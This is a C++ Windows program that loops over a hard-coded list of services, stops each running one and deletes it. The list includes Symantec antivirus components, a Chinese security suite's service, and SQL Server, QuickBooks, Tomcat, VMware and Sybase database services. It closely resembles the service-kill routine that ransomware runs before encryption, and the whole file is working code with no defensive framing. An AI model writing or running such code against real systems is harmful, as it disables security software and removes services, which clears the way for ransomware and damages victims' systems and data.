#include <windows.h>
#include <iostream>

std::string convert_to_printable(LPCWSTR);
LPCWSTR serviceNames[] = {
    L"wrapper",
    L"DefWatch", 
    L"ccEvtMgr",
    L"ccSetMgr",
    L"SavRoam",
    L"sqlservr",
    L"sqlagent",
    L"sqladhlp",
    L"Culserver",
    L"RTVscan",
    L"sqlbrowser",
    L"SQLADHLP",
    L"QBIDPService",
    L"Intuit.QuickBooks.FCS",
    L"QBCFMonitorService",
    L"sqlwriter",
    L"msmdsrv",
    L"tomcat6",
    L"zhudongfangyu",
    L"SQLADHLP",
    L"vmware-usbarbitator64",
    L"vmware-converter",
    L"dbsrv12"
};

int main()
{
    SC_HANDLE schSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (schSCManager == NULL)
    {
        std::cerr << "Failed to open service control manager\n";
        return -1;
    }

    const int numServices = sizeof(serviceNames) / sizeof(serviceNames[0]);
    for (int i = 0; i < numServices; ++i)
    {
        SC_HANDLE schService = OpenServiceW(schSCManager, serviceNames[i], SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
        if (schService == NULL)
        {
            std::cerr << "Failed to open service or service unavailable " << convert_to_printable(serviceNames[i]) << "\n";
            continue;
        }

        SERVICE_STATUS status;
        if (QueryServiceStatus(schService, &status))
        {
            if (status.dwCurrentState == SERVICE_RUNNING || status.dwCurrentState == SERVICE_PAUSED)
            {
                std::cout << "Stopping service " << convert_to_printable(serviceNames[i]) << "...\n";
                if (ControlService(schService, SERVICE_CONTROL_STOP, &status))
                    std::cout << "Service " << convert_to_printable(serviceNames[i]) << " stopped successfully\n";
                else
                    std::cerr << "Failed to stop service " << convert_to_printable(serviceNames[i]) << "\n";
            }
        }
        else
        {
            //std::cerr << "Failed to query service " << convert_to_printable(serviceNames[i]) << " status\n";
            continue;
        }

        std::cout << "Deleting service " << convert_to_printable(serviceNames[i]) << "...\n";
        if (DeleteService(schService))
            std::cout << "Service " << convert_to_printable(serviceNames[i]) << " deleted successfully\n";
        else
            std::cerr << "Failed to delete service " << convert_to_printable(serviceNames[i]) << "\n";

        //details.push_back("Close handle: CloseServiceHandle");
        CloseServiceHandle(schService);
    }
    CloseServiceHandle(schSCManager);
    return 0;
}

std::string convert_to_printable(LPCWSTR wideString)
{
    // Calculate the required buffer size for the converted string
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wideString, -1, nullptr, 0, nullptr, nullptr);
    if (bufferSize == 0)
    {
        std::cerr << "Error calculating buffer size\n";
        return "";
    }

    // Allocate a buffer for the converted string
    std::string multiByteString(bufferSize, 0);

    // Convert the wide-character string to a multibyte string
    if (!WideCharToMultiByte(CP_UTF8, 0, wideString, -1, &multiByteString[0], bufferSize, nullptr, nullptr))
    {
        std::cerr << "Error converting string\n";
        return "";
    }
    // Print the converted string
    //std::cout << multiByteString << "\n";
    return multiByteString;
}